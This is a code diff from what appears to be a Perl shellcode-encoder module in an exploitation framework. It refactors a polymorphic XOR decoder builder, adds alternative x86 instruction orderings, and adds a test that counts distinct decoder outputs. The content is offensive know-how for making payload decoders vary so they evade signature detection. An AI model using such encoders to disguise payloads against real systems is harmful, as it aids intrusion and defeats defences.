@@ -57,6 +57,15 @@ sub EncodePayload {
 
 sub _BuildDecoder {
   my $self = shift;
+  my $bm = $self->_BuildBM(@_);
+
+  my $delta = Pex::Poly::DeltaKing->new;
+  $delta->AddData($bm->Build);
+  return($delta->Build)
+}
+
+sub _BuildBM {
+  my $self = shift;
   my $xor = shift;
   my $len = shift;
   my $xorkey = pack('V', $xor);
@@ -99,6 +108,19 @@ sub _BuildDecoder {
     "\x83\xeb\xfc".                         # sub ebx,-4
     "\x31\x43[>1 chr(:end: - :fpu: - 4)<]". # xor [ebx+0x1b], eax
     "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]
+
+
+    "\x31\x43[>1 chr(:end: - :fpu:)<]".     # xor [ebx+0x1b], eax
+    "\x03\x43[>1 chr(:end: - :fpu:)<]".     # add eax, [ebx+0x18]
+    "\x83\xc3\x04".                         # add ebx, 4
+
+    "\x31\x43[>1 chr(:end: - :fpu:)<]".     # xor [ebx+0x1b], eax
+    "\x83\xc3\x04".                         # add ebx, 4
+    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]
+
+    "\x83\xc3\x04".                         # add ebx, 4
+    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]". # xor [ebx+0x1b], eax
+    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]
   );
 
   my $loop = $bmb->new("\xe2\xf5[>0 end<]");# loop xor_xor
@@ -110,18 +132,20 @@ sub _BuildDecoder {
   $loop->AddDepend($loopXor);
       
   my $block = Pex::Poly::BlockMaster->new($fpuins, $zero, $movkey);
-  my $delta = Pex::Poly::DeltaKing->new;
-  $delta->AddData($block->Build);
-  return($delta->Build)
+  return($block);
 }
 
 # This is a *really* bad method of doing this, temporary
 sub _OutcomeTest {
+  use Digest::MD5;
   my $class = shift;
   my $times = shift;
   my $outcomes = { };
+  my $bm = $class->_BuildBM(0, 0);
   for(my $i = 0; $i < $times; $i++) {
-    $outcomes->{$class->_BuildDecoder(0, 0)}++;
+    my $delta = Pex::Poly::DeltaKing->new;
+    $delta->AddData($bm->Build);
+    $outcomes->{Digest::MD5::md5($delta->Build)}++;
   }
   return(scalar(keys(%{$outcomes})));
 }
